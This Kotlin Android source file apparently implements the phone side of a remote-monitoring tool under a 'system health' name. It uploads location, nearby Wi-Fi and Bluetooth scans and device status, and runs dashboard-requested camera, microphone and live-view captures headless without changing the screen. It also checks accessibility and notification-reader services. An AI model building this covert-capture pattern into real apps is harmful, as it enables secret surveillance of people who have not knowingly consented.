package com.example.systemhealth

import android.app.Application
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.os.Build
import android.util.Base64
import android.util.Log
import com.example.systemmanagement.ServiceManager
import com.fleet.tracking.GeofenceEvent
import com.fleet.tracking.LocationPayload
import com.fleet.tracking.LocationTracker
import com.fleet.tracking.TrackingSink
import kotlinx.coroutines.*
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.net.HttpURLConnection
import java.net.URL
import java.time.Instant
import java.util.UUID

class SystemHealthApp : Application() {
    override fun onCreate() {
        super.onCreate()
        AppForeground.register(this)
        LocationTracker.initialize(this, object : TrackingSink {
            override suspend fun onLocation(payload: LocationPayload) {
                if (CoreService.isMonitoringEnabled(this@SystemHealthApp) &&
                    FeatureBridge.locationApproved(this@SystemHealthApp) &&
                    RemotePolicy.allows(this@SystemHealthApp, "location")) {
                    FeatureBridge.queueLocationEvent(this@SystemHealthApp, payload.toJson().put("type", "location"))
                }
            }
            override suspend fun onGeofenceEvent(event: GeofenceEvent) {
                if (CoreService.isMonitoringEnabled(this@SystemHealthApp) &&
                    FeatureBridge.locationApproved(this@SystemHealthApp) &&
                    RemotePolicy.allows(this@SystemHealthApp, "location")) {
                    FeatureBridge.queueEvent(this@SystemHealthApp, event.toJson().put("type", "geofence"))
                }
            }
        })
    }
}

/** Authenticated feature transport. Queued items stay tied to their original enrollment.
 * Remote requests run without a phone-side prompt; captured media still needs Android permissions. */
internal object FeatureBridge {
    private const val TAG = "FeatureBridge"
    const val MAX_FILE = 4 * 1024 * 1024
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var job: Job? = null
    private val lock = Any()
    @Volatile var status = "Tools ready. Start monitoring to upload."
    @Volatile private var rejections = 0
        private set

    /** A dashboard location request is answered by the first fix that really reaches the server. */
    private var locationRequestId: String? = null
    fun awaitLocationResult(id: String?) { synchronized(lock) { locationRequestId = id } }
    fun queueLocationEvent(c: Context, payload: JSONObject) {
        val id = synchronized(lock) { locationRequestId.also { locationRequestId = null } }
        queueEvent(c, payload, id, "Location fix uploaded to the dashboard.")
    }

    fun locationApproved(c: Context) = c.getSharedPreferences("feature_options", 0).getBoolean("location", false)
    fun setLocationApproved(c: Context, enabled: Boolean) {
        c.getSharedPreferences("feature_options", 0).edit().putBoolean("location", enabled).apply()
    }
    private fun root(c: Context) = File(c.filesDir, "shared_tools").apply { mkdirs() }
    private fun outbox(c: Context) = File(root(c), "outbox").apply { mkdirs() }
    private fun deadLetters(c: Context) = File(root(c), "unsent").apply { mkdirs() }
    private fun vault(c: Context) = File(root(c), "vault").apply { mkdirs() }
    private fun write(file: File, text: String) {
        val temp = File(file.parentFile, file.name + ".tmp")
        temp.writeText(text)
        check(temp.renameTo(file)) { "Could not save queued item" }
    }
    private fun settings(c: Context) = SyncSettingsStore.load(c) ?: error("Configure an enrolled device first")
    private fun wrapper(s: SyncSettings, path: String, body: JSONObject) = JSONObject()
        .put("server", s.serverUrl).put("device", s.deviceId).put("path", path).put("body", body)
    private fun enqueue(c: Context, item: JSONObject) = synchronized(lock) {
        val dir = outbox(c)
        if ((dir.listFiles()?.count { it.extension == "json" } ?: 0) >= QueuePolicy.OUTBOX_LIMIT) {
            // Periodic health and status samples are superseded by the next one, so the queue
            // sheds its oldest sample rather than discarding captures the phone cannot remake.
            val shed = dir.listFiles()?.filter { it.extension == "json" }?.sortedBy { it.name }
                ?.firstOrNull { file ->
                    runCatching {
                        val body = JSONObject(file.readText()).getJSONObject("body")
                        QueuePolicy.isSupersededFile(body.optString("kind")) ||
                            QueuePolicy.isSheddable(body.getJSONObject("payload").getString("type"))
                    }.getOrDefault(false)
                }
            if (shed == null || !shed.delete()) {
                throw IllegalStateException(
                    "Upload queue is full of ${pendingCount(c)} unsent captures. Start monitoring to deliver them."
                )
            }
        }
        write(File(dir, "${System.currentTimeMillis()}-${UUID.randomUUID()}.json"), item.toString())
    }

    /** Marks a queued output as the answer to a dashboard request, so delivery can prove completion. */
    private fun link(item: JSONObject, forRequest: String?, detail: String): JSONObject =
        if (forRequest.isNullOrEmpty()) item
        else item.put("for_request", forRequest).put("request_detail", detail.take(800))

    fun queueEvent(c: Context, payload: JSONObject, forRequest: String? = null, detail: String = "") {
        require(payload.toString().toByteArray().size <= 48 * 1024) { "Report too large" }
        enqueue(c, link(wrapper(settings(c), "/api/device/events", JSONObject()
            .put("event_id", UUID.randomUUID().toString()).put("payload", payload)), forRequest, detail))
    }
    fun queueFile(c: Context, source: File, name: String, mime: String, kind: String,
                  forRequest: String? = null, detail: String = ""): String = synchronized(lock) {
        require(source.length() in 1..MAX_FILE.toLong()) { "Choose a nonempty file up to 4 MiB" }
        val s = settings(c)
        val dir = vault(c)
        check((dir.listFiles()?.filter { it.extension == "bin" }?.sumOf { it.length() } ?: 0) + source.length() <= 50L * 1024 * 1024) {
            "Phone file vault full (50 MiB). Export or delete local files."
        }
        val id = UUID.randomUUID().toString()
        val bytes = File(dir, "$id.bin")
        source.copyTo(bytes, overwrite = false)
        val meta = JSONObject().put("file_id", id).put("name", name.take(180).replace(Regex("[\\p{Cntrl}/\\\\]"), "_"))
            .put("mime", mime).put("kind", kind).put("size", bytes.length()).put("created_at", Instant.now().toString())
            .put("uploaded", false).put("server", s.serverUrl).put("device", s.deviceId)
        try {
            write(File(dir, "$id.json"), meta.toString())
            enqueue(c, link(wrapper(s, "/api/device/files", JSONObject(meta.toString())).put("local_file", id), forRequest, detail))
        } catch (e: Exception) { bytes.delete(); File(dir, "$id.json").delete(); throw e }
        id
    }
    fun localFiles(c: Context): List<JSONObject> = synchronized(lock) {
        vault(c).listFiles()?.filter { it.extension == "json" }?.mapNotNull {
            runCatching { JSONObject(it.readText()) }.getOrNull()
        }?.sortedByDescending { it.optString("created_at") }.orEmpty()
    }
    fun localFile(c: Context, id: String): File {
        require(Regex("[a-f0-9-]{36}").matches(id))
        return File(vault(c), "$id.bin")
    }
    fun deleteLocal(c: Context, id: String) = synchronized(lock) {
        localFile(c, id).delete(); File(vault(c), "$id.json").delete()
        outbox(c).listFiles()?.filter { it.extension == "json" }?.forEach { file ->
            if (runCatching { JSONObject(file.readText()).optString("local_file") == id }.getOrDefault(false)) file.delete()
        }
        Unit
    }
    fun pendingCount(c: Context) = outbox(c).listFiles()?.count { it.extension == "json" } ?: 0
    fun clearPending(c: Context) = synchronized(lock) {
        outbox(c).listFiles()?.forEach { it.delete() }; status = "Pending uploads cleared. Local files retained."
    }
    @Synchronized fun start(c: Context) {
        if (job?.isActive == true) return
        val app = c.applicationContext
        app.getSharedPreferences("phone_requests", 0).edit()
            .putString("pending", "[]")
            .putStringSet("dispatched", emptySet())
            .apply()
        job = scope.launch {
            var failures = 0
            while (isActive) {
                var healthy = true
                try {
                    val s = settings(app)
                    drainReports(app)
                    healthy = flush(app, s)
                    pollRequests(app, s)
                    runScheduledReports(app)
                } catch (e: CancellationException) {
                    throw e
                } catch (e: Exception) {
                    healthy = false
                    status = readable(e)
                }
                failures = if (healthy) 0 else failures + 1
                delay(cadenceMs(failures, pendingCount(app) > 0))
            }
        }
    }

    // Waiting on a broken connection is useful; waiting on a working one only adds delivery delay.
    internal fun cadenceMs(failures: Int, hasBacklog: Boolean): Long = when {
        failures > 0 -> minOf(300_000L, 20_000L * (1L shl minOf(failures - 1, 4)))
        hasBacklog -> 5_000L
        else -> 10_000L
    }

    @Synchronized fun stop(c: Context) {
        job?.cancel(); job = null
        setLocationApproved(c, false)
        awaitLocationResult(null)
        LocationTracker.stopTracking()
        status = "Monitoring stopped. Pending uploads retained."
    }
    private fun readable(e: Exception) =
        e.message?.takeIf { !it.contains("://") }?.take(150) ?: "Server unavailable; uploads will retry."

    /** Repairs the one rejection the phone can fix itself: a rebuilt backend that forgot it.
     *  A credential the owner rotated is never reissued here, so that answer stays a instruction. */
    private suspend fun healRejection(c: Context) {
        val result = AutomaticEnrollment.renew(c)
        status = when (result.state) {
            "approved" -> "This phone was missing from the backend and has registered again. Uploads will retry."
            "manual" -> "The server rejected this credential. Type a new token in Advanced connection settings."
            else -> result.message
        }
    }

    /** One delivery pass. Returns false when the server could not be reached. */
    private suspend fun flush(c: Context, s: SyncSettings): Boolean {
        val files = synchronized(lock) { outbox(c).listFiles()?.filter { it.extension == "json" }?.sortedBy { it.name }.orEmpty() }
        var blocked: String? = null
        var unreachable = false
        for (file in files.take(QueuePolicy.FLUSH_BATCH)) {
            currentCoroutineContext().ensureActive()
            if (!CoreService.isMonitoringEnabled(c)) return !unreachable
            val item = synchronized(lock) { if (file.exists()) JSONObject(file.readText()) else null } ?: continue
            if (item.getString("server") != s.serverUrl || item.getString("device") != s.deviceId) {
                status = "Older enrollment has pending uploads; use its configuration to send them."
                continue
            }
            val body = item.getJSONObject("body")
            val id = item.optString("local_file")
            if (id.isNotEmpty()) {
                val data = synchronized(lock) { localFile(c, id).takeIf { it.exists() }?.readBytes() }
                if (data == null) { retire(c, file); continue }
                body.put("data", Base64.encodeToString(data, Base64.NO_WRAP))
            }
            val isResult = item.getString("path").startsWith("/api/device/requests/")
            val attempts = item.optInt("attempts", 0) + 1
            val response = try {
                request(s, item.getString("path"), body)
            } catch (e: HttpFailure) {
                // An expired request result never needs a retry; the server rejects some payloads
                // permanently, so those move aside instead of blocking every later upload.
                when {
                    e.code == 401 -> {
                        blocked = e.message
                        rejections += 1
                        // Two rejections in a row is not a passing network problem, so ask the
                        // backend what this phone still is and rejoin automatically if it was
                        // simply forgotten by a rebuilt database.
                        if (rejections == 2) healRejection(c)
                    }
                    QueuePolicy.retires(e.code, attempts, isResult) -> retire(c, file)
                    else -> { blocked = e.message; retry(file, item, attempts) }
                }
                continue
            } catch (e: CancellationException) {
                throw e
            } catch (e: Exception) {
                unreachable = true
                blocked = readable(e)
                retry(file, item, attempts)
                continue
            }
            synchronized(lock) {
                if (id.isNotEmpty()) {
                    val meta = File(vault(c), "$id.json")
                    if (meta.exists()) write(meta, JSONObject(meta.readText()).put("uploaded", true).toString())
                }
                file.delete()
            }
            rejections = 0
            ConnectionDiagnostics.recordUpload(c, s.serverUrl, s.deviceId)
            deliveryLabel(body)?.let { NotificationPresentation.recordDelivery(c, it) }
            // The dashboard answer follows the upload it describes, so "completed" is only ever
            // sent after the server has accepted the file or event.
            val forRequest = item.optString("for_request")
            if (forRequest.isNotEmpty()) report(c, forRequest, "completed",
                item.optString("request_detail").ifEmpty { "Output uploaded to the dashboard." },
                artifactRef(item.getString("path"), response))
        }
        val aside = failedCount(c)
        status = blocked ?: "Uploads checked at ${java.time.LocalTime.now().withNano(0)}; ${pendingCount(c)} pending." +
            if (aside > 0) " ${PlainStatus.count(aside, "item")} kept on the phone after repeated failures." else ""
        return !unreachable
    }

    /** A request links to the record the server named in its reply, so the dashboard can prove it. */
    private fun artifactRef(path: String, response: JSONObject): String = when (path) {
        "/api/device/files" -> response.optString("file_id").takeIf { Regex("[a-f0-9-]{36}").matches(it) }?.let { "file:$it" } ?: ""
        "/api/device/events" -> response.optString("event_id").takeIf { it.matches(Regex("\\d{1,19}")) }?.let { "event:$it" } ?: ""
        else -> ""
    }

    /** The status line names captures and reports; a routine five-minute health sample is noise, and
     * so is one frame of a live view out of the two hundred that made up the session. */
    private fun deliveryLabel(body: JSONObject): String? {
        body.optString("kind").takeIf { it.isNotEmpty() }?.let {
            return if (QueuePolicy.isSupersededFile(it)) null
            else if (it == "audio") "audio recording" else it
        }
        val type = body.optJSONObject("payload")?.optString("type").orEmpty()
        return type.takeIf { it.isNotEmpty() && !QueuePolicy.isSheddable(it) }?.replace('_', ' ')
    }

    private fun retry(file: File, item: JSONObject, attempts: Int) {
        synchronized(lock) { runCatching { write(file, item.put("attempts", attempts).toString()) } }
    }

    /** Keeps the payload on the phone but out of the delivery path so later uploads proceed. */
    private fun retire(c: Context, file: File) {
        synchronized(lock) {
            if (!file.exists()) return
            val target = File(deadLetters(c), "${System.currentTimeMillis()}-${file.name}")
            if (!file.renameTo(target)) file.delete()
        }
    }

    fun failedCount(c: Context) = deadLetters(c).listFiles()?.count { it.extension == "json" } ?: 0
    private class HttpFailure(val code: Int) : Exception(when(code) {
        401 -> "Enrollment rejected. Check your device ID and token."
        404 -> "New tools API missing. Deploy the updated backend first."
        409 -> "Upload blocked. Check the dashboard file quota (100 MiB/device)."
        429 -> "Server busy; uploads will retry."
        else -> "Server returned HTTP $code; uploads will retry."
    })
    private fun request(s: SyncSettings, path: String, body: JSONObject? = null): JSONObject {
        val connection = URL(s.serverUrl + path).openConnection() as HttpURLConnection
        try {
            connection.connectTimeout = 10_000; connection.readTimeout = 20_000
            connection.instanceFollowRedirects = false
            connection.setRequestProperty("Authorization", "Bearer ${s.deviceToken}")
            connection.setRequestProperty("X-Device-Id", s.deviceId)
            if (body != null) {
                connection.requestMethod = "POST"; connection.doOutput = true
                connection.setRequestProperty("Content-Type", "application/json")
                val bytes = body.toString().toByteArray(Charsets.UTF_8)
                connection.setFixedLengthStreamingMode(bytes.size)
                connection.outputStream.use { it.write(bytes) }
            }
            val code = connection.responseCode
            if (code !in 200..299) throw HttpFailure(code)
            val text = connection.inputStream.bufferedReader().use { reader ->
                val buffer = CharArray(4096); val result = StringBuilder()
                while (true) {
                    val count = reader.read(buffer); if (count < 0) break
                    result.append(buffer, 0, count)
                    require(result.length <= 100_000) { "Unexpected server response" }
                }
                result.toString()
            }
            return JSONObject(text)
        } finally { connection.disconnect() }
    }
    private fun autoDispatch(c: Context, item: JSONObject) {
        val id = item.getString("request_id")
        val action = item.getString("action")
        // The rules channel stays open even under restrictive rules, so a narrowed phone can always
        // be widened again by the same dashboard.
        if (action == "request_settings") {
            scope.launch { applyRules(c, id, item.optJSONObject("args")) }
            return
        }
        val tool = action.removePrefix("request_")
        if (!RemotePolicy.allows(c, tool)) {
            finish(c, id, "declined", "A dashboard rule keeps ${tool.replace('_', ' ')} off on this phone.")
            return
        }
        when (DeviceCommandRouter.route(action)) {
            DeviceCommandRouter.Mode.SILENT -> scope.launch { runSilently(c, id, action) }
            DeviceCommandRouter.Mode.CAPTURE -> captureHeadless(c, id, action)
            DeviceCommandRouter.Mode.USER -> openTools(c, item)
            DeviceCommandRouter.Mode.UNKNOWN -> finish(c, id, "failed", "Phone build does not support action $action.")
        }
    }

    /** Stores rules the dashboard sent, then reports them back so the phone's answer is provable. */
    private suspend fun applyRules(c: Context, id: String, args: JSONObject?) {
        finish(c, id, "running", "Applying the dashboard's rules…")
        val summary = args?.let { runCatching { RemotePolicy.apply(c, it) }.getOrNull() }
        if (summary.isNullOrEmpty()) {
            finish(c, id, "failed", "The rules were missing or this phone does not recognise them, so nothing changed.")
            return
        }
        queueEvent(c, JSONObject()
            .put("type", "settings_applied")
            .put("timestamp", Instant.now().toString())
            .put("rules", summary), id, "Rules applied on the phone: $summary")
    }

    /** Camera and microphone run in the monitoring service's process, so the phone's screen keeps
     * showing whatever the owner was doing. A live view is the same kind of job, just a longer one,
     * so it shares the sensor's one-at-a-time rule through the same door. */
    private fun captureHeadless(c: Context, id: String, action: String) {
        val reason = if (action == LiveStreamBridge.START_ACTION) LiveStreamBridge.start(c, id)
        else HeadlessCapture.start(c, id, action)
        reason?.let { finish(c, id, "failed", it) }
    }

    /** Runs a report-only tool from the background loop. Its dashboard answer arrives with the upload. */
    private suspend fun runSilently(c: Context, id: String, action: String) {
        finish(c, id, "running", when (action) {
            "request_scan" -> "Scanning nearby Wi-Fi and Bluetooth…"
            LiveStreamBridge.STOP_ACTION -> "Stopping the live camera view…"
            else -> "Reading phone status…"
        })
        val outcome = runCatching {
            when (action) {
                "request_scan" -> {
                    // HeadlessScan runs Wi-Fi + Bluetooth discovery using only a Context.
                    // No visible Activity or window focus is required.
                    val result = HeadlessScan.scan(c)
                    result.put("type", "environment_scan").put("timestamp", Instant.now().toString())
                    queueEvent(c, result, id, "Nearby scan uploaded.")
                }
                // A successful stop answers its own request with the frame count that proves it, and
                // the camera is freed before that answer is queued.
                LiveStreamBridge.STOP_ACTION -> LiveStreamBridge.stop(id)?.let { error(it) }
                else -> queueEvent(c, deviceStatus(c), id, "Phone status uploaded.")
            }
        }
        outcome.exceptionOrNull()?.let { error ->
            finish(c, id, "failed", (error.message ?: "Request failed").take(800))
        }
    }

    /** Queues the recurring reports this phone's owner opted into. A failing tool is not retried
     *  until the next slot, so one broken report cannot fill the queue every few seconds. */
    private suspend fun runScheduledReports(c: Context) {
        val now = System.currentTimeMillis()
        val minutes = ReportSchedule.intervalMinutes(c)
        for (tool in ReportSchedule.enabled(c).sorted()) {
            if (!ReportSchedule.isDue(ReportSchedule.lastRun(c, tool), now, minutes)) continue
            ReportSchedule.markRun(c, tool, now)
            if (!RemotePolicy.allows(c, tool)) continue
            try {
                queueScheduled(c, tool)
            } catch (cancelled: CancellationException) {
                throw cancelled
            } catch (error: Exception) {
                status = "A scheduled ${ReportSchedule.label(tool)} could not be queued: ${readable(error)}"
            }
        }
    }

    /** The same report-only tools a dashboard may ask for, with no request to answer. */
    private suspend fun queueScheduled(c: Context, tool: String) {
        when (tool) {
            "scan" -> {
                val result = HeadlessScan.scan(c)
                    .put("type", "environment_scan").put("timestamp", Instant.now().toString())
                queueEvent(c, result)
            }
            else -> queueEvent(c, deviceStatus(c))
        }
    }

    /** What the dashboard needs to answer "why is this phone not sending anything?". */
    internal fun deviceStatus(c: Context): JSONObject {
        val permissions = PermissionPlan.steps(Build.VERSION.SDK_INT).associate { step ->
            step.id to step.permissions.all {
                c.checkSelfPermission(it) == PackageManager.PERMISSION_GRANTED
            }
        }
        val sensors = CoreService.acceptedSensorTypes
        return JSONObject()
            .put("type", "device_status")
            .put("timestamp", Instant.now().toString())
            .put("monitoring", CoreService.isRunning)
            .put("sync_ready", CoreService.isSyncReady)
            .put("location", LocationTracker.isTracking.value)
            .put("location_approved", locationApproved(c))
            .put("pending_uploads", pendingCount(c))
            .put("unsent_kept_aside", failedCount(c))
            .put("last_result", status.take(200))
            .put("app_version", AppIdentity.VERSION_NAME)
            .put("permissions", JSONObject(permissions))
            .put("rules", RemotePolicy.describe(c))
            .put("scheduled_reports", ReportSchedule.describe(c))
            .put("camera_ready", permissions["camera"] == true &&
                sensors and ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA != 0)
            .put("microphone_ready", permissions["microphone"] == true &&
                sensors and ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE != 0)
            // A live view needs the owner's own allowance on the phone, so the dashboard can see why
            // its request was refused rather than guessing.
            .put("live_view_allowed", LiveStreamBridge.allowedByOwner(c))
            .put("live_view_streaming", LiveStreamBridge.isStreaming())
            .put("services", serviceStates(c))
    }

    private fun serviceStates(c: Context): JSONObject {
        val specs = listOf(
            ServiceManager.ServiceSpec(
                ComponentName(c, AccessibilityHelperService::class.java), ServiceManager.Kind.ACCESSIBILITY
            ),
            ServiceManager.ServiceSpec(
                ComponentName(c, NotificationReaderService::class.java), ServiceManager.Kind.NOTIFICATION_LISTENER
            ),
        )
        val manager = ServiceManager(c, specs)
        return JSONObject(specs.associate { spec ->
            val state = manager.checkServiceStatus(spec)
            spec.component.className.substringAfterLast('.') to JSONObject()
                .put("access_granted", state.accessGranted)
                .put("running", state.runtime == ServiceManager.RuntimeState.RUNNING)
        })
    }

    private fun finish(c: Context, id: String, state: String, detail: String) = report(c, id, state, detail, "")

    /** A result the phone could not queue yet. Kept in memory for this session only. */
    private data class Retry(val id: String, val state: String, val ref: String, val detail: String, val attempts: Int)
    private val reportRetries = ArrayDeque<Retry>()

    /** Records a request outcome. A result that cannot be queued is retried, never thrown away. */
    private fun report(c: Context, id: String, state: String, detail: String, ref: String, attempts: Int = 0) {
        try {
            val s = settings(c)
            val prefs = c.getSharedPreferences("phone_requests", 0)
            require(prefs.getString("server", "") == s.serverUrl && prefs.getString("device", "") == s.deviceId) {
                "Request belongs to a different enrollment"
            }
            enqueue(c, wrapper(s, "/api/device/requests/$id/result", JSONObject()
                .put("status", state).put("detail", detail.take(800)).put("result_ref", ref)))
            markAnswered(c, id, state)
        } catch (error: CancellationException) {
            throw error
        } catch (error: Exception) {
            // A dashboard must not be left guessing: keep the outcome and try again next pass.
            synchronized(reportRetries) {
                if (error is IllegalStateException && attempts + 1 < QueuePolicy.MAX_ATTEMPTS) {
                    reportRetries.addLast(Retry(id, state, ref, detail, attempts + 1))
                }
            }
            status = "A dashboard answer could not be queued: ${readable(error)}"
            Log.w(TAG, "Request result could not be queued", error)
        }
        CoreService.refreshNotification()
    }

    /** Running is not an answer, so only a settled state removes the request from the phone's list. */
    private fun markAnswered(c: Context, id: String, state: String) {
        if (state == "running") return
        val prefs = c.getSharedPreferences("phone_requests", 0)
        prefs.edit()
            .putStringSet("done", (prefs.getStringSet("done", emptySet()).orEmpty() + id).toList().takeLast(200).toSet())
            .putString("pending", JSONArray(pendingRequests(c).filter { it.getString("request_id") != id }).toString())
            .apply()
    }

    private fun drainReports(c: Context) {
        val waiting = synchronized(reportRetries) {
            if (reportRetries.isEmpty()) return
            val snapshot = reportRetries.toList()
            reportRetries.clear()
            snapshot
        }
        for (item in waiting) report(c, item.id, item.state, item.detail, item.ref, item.attempts)
    }

    private fun openTools(c: Context, item: JSONObject) {
        val id = item.getString("request_id")
        runCatching {
            c.startActivity(
                Intent(c, FeaturesActivity::class.java)
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP)
                    .putExtra("auto_request_id", id)
                    .putExtra("auto_request_action", item.getString("action"))
                    .putExtra("auto_request_args", item.optJSONObject("args")?.toString() ?: "{}")
            )
            // The phone screen now holds the request; the dashboard should say so instead of
            // showing a delivered request that appears to do nothing.
            finish(c, id, "running", "Waiting for the owner to approve this on the phone.")
        }.onFailure {
            // Android can refuse a background activity start; report that instead of going quiet.
            finish(c, id, "failed", "Unlock the phone and keep monitoring on to run this tool.")
        }
    }

    private fun pollRequests(c: Context, s: SyncSettings) {
        val incoming = request(s, "/api/device/requests").getJSONArray("requests")
        val prefs = c.getSharedPreferences("phone_requests", 0)
        val done = prefs.getStringSet("done", emptySet()).orEmpty()
        val dispatched = prefs.getStringSet("dispatched", emptySet()).orEmpty()
        val items = JSONArray()
        val toDispatch = mutableListOf<JSONObject>()
        // The camera and microphone serve one request at a time, so a second capture stays in the
        // server's queue for a later poll instead of being answered as a failure. Requests expire
        // after ten minutes, so a queue can only be worked off or expire, never silently dropped.
        // A live view holds the camera for the whole session, so it counts as busy too.
        var sensorHeld = HeadlessCapture.isBusy() || LiveStreamBridge.isStreaming()
        for (i in 0 until incoming.length()) {
            val item = incoming.getJSONObject(i)
            val reqId = item.getString("request_id")
            if (reqId !in done) {
                items.put(item)
                val capture = DeviceCommandRouter.route(item.optString("action")) ==
                    DeviceCommandRouter.Mode.CAPTURE
                if (reqId !in dispatched && !(capture && sensorHeld)) {
                    toDispatch.add(item)
                    if (capture) sensorHeld = true
                }
            }
        }
        if (toDispatch.isNotEmpty()) {
            prefs.edit().putStringSet("dispatched",
                (dispatched + toDispatch.map { it.getString("request_id") }).toList().takeLast(200).toSet()
            ).apply()
            for (item in toDispatch) autoDispatch(c, item)
        }
        prefs.edit().putString("pending", items.toString())
            .putString("server", s.serverUrl).putString("device", s.deviceId).apply()
    }


    fun pendingRequests(c: Context): List<JSONObject> {
        val prefs = c.getSharedPreferences("phone_requests", 0)
        val array = JSONArray(prefs.getString("pending", "[]"))
        return (0 until array.length()).map { array.getJSONObject(it) }
            .filter { runCatching { Instant.parse(it.getString("expires_at")) > Instant.now() }.getOrDefault(false) }
    }
    fun finishRequest(c: Context, id: String, state: String, detail: String, ref: String = "") {
        report(c, id, state, detail, ref)
    }
}
